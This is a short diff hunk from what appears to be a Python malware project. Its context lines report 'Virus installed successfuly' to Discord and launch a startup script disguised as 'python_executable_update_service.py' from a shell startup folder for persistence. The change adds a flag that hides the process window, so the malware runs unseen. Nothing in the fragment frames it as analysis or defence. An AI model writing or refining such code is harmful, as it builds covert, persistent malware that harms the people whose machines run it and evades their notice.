@@ -57,4 +57,4 @@ log_to_discord("Virus installed successfuly. Running it...")
 print("Starting virus...")
 startup_script = os.path.join(shell_startup_dir, "python_executable_update_service.py")
 import subprocess
-subprocess.Popen([PYTHON_COMMAND, startup_script])
+subprocess.Popen([PYTHON_COMMAND, startup_script], creationflags=subprocess.CREATE_NO_WINDOW)
